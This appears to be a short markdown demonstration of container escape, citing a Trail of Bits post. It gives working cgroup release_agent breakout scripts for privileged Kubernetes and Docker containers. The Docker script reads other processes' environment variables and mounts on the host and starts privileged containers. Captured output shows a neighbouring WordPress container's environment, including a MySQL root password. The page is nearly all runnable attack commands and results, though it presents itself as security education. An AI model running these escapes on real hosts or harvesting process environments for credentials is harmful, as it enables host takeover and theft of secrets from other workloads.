# Demonstration of container security

Source: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/


Running an Ubuntu container as privileged, to demo breakout
```shell
kubectl run -it --image=ubuntu --privileged=true -- bash
```

basic breakout in kubernetes
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps >'"$t/o" >/c;
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

Docker break, very similar
```shell
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps -afx > $host_path/output" >> /cmd
echo "cat /proc/103541/environ > $host_path/output.environ" >> /cmd
echo "cat /proc/103541/mounts > $host_path/output.mounts" >> /cmd
echo "ls /proc/103541 > $host_path/output.proc" >> /cmd
echo "ls /var/lib/docker/overlay2 > $host_path/output.o2" >> /cmd
echo "docker run nginx --privileged > $host_path/output.dockerrun" >> /cmd
echo "docker run nginx --privileged > $host_path/output.dockerrun" >> /cmd
echo "docker run nginx --privileged > $host_path/output.dockerrun" >> /cmd
echo "docker run nginx --privileged > $host_path/output.dockerrun" >> /cmd
echo "docker ps > $host_path/output.dockerps" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Output of `ps -afx` command:
```shell
  98979 ?        Sl     0:00  \_ containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/cac798dc4b3410f9250ce01e98ae94a1c4d89de1e48f01a9cb2a58f03778d79c -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
  98997 ?        Ss     0:00  |   \_ apache2 -DFOREGROUND
  99032 ?        S      0:00  |       \_ apache2 -DFOREGROUND
  99033 ?        S      0:00  |       \_ apache2 -DFOREGROUND
  99034 ?        S      0:00  |       \_ apache2 -DFOREGROUND
  99035 ?        S      0:00  |       \_ apache2 -DFOREGROUND
  99036 ?        S      0:00  |       \_ apache2 -DFOREGROUND
```

Output of process 98997 environment variables
```shell
KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_SERVICE_PORT=443HOSTNAME=wordpress-6c656f8659-q85gpPHP_VERSION=7.4.21APACHE_CONFDIR=/etc/apache2PHP_INI_DIR=/usr/local/etc/phpGPG_KEYS=42670A7FE4D0441C8E4632349E4FDC074A4EF02D 5A52880781F755608BF815FC910DEB46F53EA312PHP_LDFLAGS=-Wl,-O1 -piePWD=/var/www/htmlAPACHE_LOG_DIR=/var/log/apache2LANG=CKUBERNETES_PORT_443_TCP=tcp://10.8.0.1:443MYSQL_DB_USER=rootPHP_SHA256=cf43384a7806241bc2ff22022619baa4abb9710f12ec1656d0173de992e32a90APACHE_PID_FILE=/var/run/apache2/apache2.pidPHPIZE_DEPS=autoconf                 dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2cPHP_URL=https://www.php.net/distributions/php-7.4.21.tar.xzAPACHE_RUN_GROUP=www-dataAPACHE_LOCK_DIR=/var/lock/apache2PHP_EXTRA_CONFIGURE_ARGS=--with-apxs2 --disable-cgiMYSQL_DB_PASSWORD=super-secret-passwordSHLVL=0KUBERNETES_PORT_443_TCP_PROTO=tcpPHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64KUBERNETES_PORT_443_TCP_ADDR=10.8.0.1APACHE_RUN_DIR=/var/run/apache2APACHE_ENVVARS=/etc/apache2/envvarsKUBERNETES_SERVICE_HOST=10.8.0.1KUBERNETES_PORT=tcp://10.8.0.1:443KUBERNETES_PORT_443_TCP_PORT=443APACHE_RUN_USER=www-dataPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPHP_EXTRA_BUILD_DEPS=apache2-devPHP_ASC_URL=https://www.php.net/distributions/php-7.4.21.tar.xz.ascPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64root@bash:/
```

Reading environmet variables of process
```shell
echo "cat /proc/98979/environ > $host_path/output" >> /cmd
```